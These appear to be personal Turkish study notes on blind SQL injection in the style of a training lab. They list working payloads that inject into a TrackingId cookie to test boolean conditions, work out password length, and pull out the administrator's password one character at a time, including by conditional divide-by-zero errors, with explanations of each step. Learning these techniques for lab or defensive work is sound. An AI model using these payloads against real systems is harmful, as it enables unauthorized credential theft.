# Blind SQL injection (Kör SQL enjeksiyonu)

### Tanım
- SELECT * FROM sessions WHERE TrackingId = 'xyz123';
- SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='1'
- TrackingId=JNwDzr5zsVqhNLyC' AND '1'='1
- SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='2'
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a 
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ==> welcome back
-  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
- TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- 

-------------------------------------

- ==> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
    - SELECT TrackingId → TrackingId sütunundaki değeri alır.
    - FROM TrackedUsers → TrackedUsers tablosundan veri çeker.
    - WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' → Sadece belirli bir TrackingId değerine sahip satırları döndürür.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'

    -     SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)
        - "Administrator" kullanıcısının şifresinin ilk karakterini alır.
    - > 'm'
        - Şifrenin ilk harfinin 'm'den büyük olup olmadığını kontrol eder.
        - Eğer doğruysa, sorgu başarılı olur ve veri döner.
        - Eğer yanlışsa, sorgu başarısız olur ve veri dönmez.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'

Açıklama:

    CASE WHEN (1=2) THEN 1/0 ELSE 'a' END
        (1=2) → FALSE döner
        FALSE olursa 'a' döner.
        TRUE olsaydı 1/0 çalışarak sıfıra bölme hatası oluşturacaktı.

    (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
        Burada CASE ifadesi 'a' döndürdüğü için sorgu başarıyla çalışır ve veri dönebilir.
        Eğer (1=2) yerine (1=1) yazılsaydı, 1/0 işlemi hata oluştururdu.

Bu teknikle saldırgan şunları test edebilir:

    SQL Injection var mı?
        Hata mesajı alırsa, SQL Injection zafiyeti var demektir.
    Hata tabanlı saldırılar mümkün mü?
        Eğer hata mesajı alınabiliyorsa (1/0 sıfıra bölme hatası gibi), saldırgan hata tabanlı SQL Injection kullanabilir.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND (SELECT CASE 
        WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') 
        THEN 1/0 
        ELSE 'a' 
      END FROM Users)='a'

-------------------------------------